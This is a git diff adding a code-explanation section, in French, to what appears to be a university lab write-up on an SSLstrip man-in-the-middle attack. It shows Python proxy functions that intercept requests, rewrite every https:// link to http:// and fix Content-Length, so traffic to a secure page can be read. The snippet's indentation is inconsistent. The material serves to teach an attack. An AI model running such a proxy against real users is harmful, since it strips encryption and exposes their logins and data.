@@ -106,6 +106,60 @@ Nous pouvons maintenant lancer l'attaque depuis la machine immortal :
 
 ![screen4](https://repo.t0x0sh.org/images/mastercsi-ter/sslstrip/screen4.png)
 
+### Explication du code
+
+#### Réception de requêtes
+
+Lors de la réception de requêtes, il s'agit de savoir si l'on doit :
+
+- fermer la connexion, si l'on a reçu 0 donnée
+- établir une connexion https, dans le cas où le client demande la page "secure.php"
+- établir une connexion http, dans le cas où le client demande la page d'accueil
+
+```python
+def __recv(self, csock):
+        fw_sock = self.__csockets[csock]
+        data = csock.recv(BUFFER_SIZE)
+        if len(data) == 0:
+            self.__close_conn(csock)
+            self.__close_conn(fw_sock)
+        else:
+            print(data)
+
+            if fw_sock is None:
+                m = re.search(b'(GET|POST) (\S+) HTTP/\d.\d', data)
+                if m is not None and m.group(2) in HTTPS_URL:
+                    self.__new_https_conn(csock)
+                else:
+                    self.__new_http_conn(csock)
+                fw_sock = self.__csockets[csock]
+            data = self.__replace_https_to_http(data)
+            data = self.__replace_content_length(data)
+            fw_sock.send(data)
+
+```
+
+A la fin, on transforme tous les liens __https__ trouvé en __http__. Et, on recalcule la taille de la requête.
+
+#### Transformation des liens
+
+```python
+def __replace_https_to_http(self, data):
+        return re.sub(b'https://', b'http://', data)
+
+def __replace_content_length(self, data):
+	try:
+		idx = data.index(b"\r\n\r\n")
+        length = len(data) - idx - 4
+        return re.sub(b'Content-Length: (\d+)',
+                      b'Content-Length: %d' % length, data, 1)
+    except:
+        return data
+```
+
+La transformation se fait à l'aide d'une rechercher expression qui remplace __https__ par __http__.
+De même, quand on recalcule la longueur de la requête, on replace directement le champ __Content-Length__ directement. 
+
 ## Etape 3 : pendant l'attaque
 
 Lorsque l'attaque est lancée, on peut voir que tous les liens https:// sont remplacés par http://. La machine immortal est donc capable d'intercepter les échanges réalisés sur la page secure.php. Ici on voit dans l'encadré rouge, que le lien https:// a bien été remplacé par un lien non sécurisé http:// :
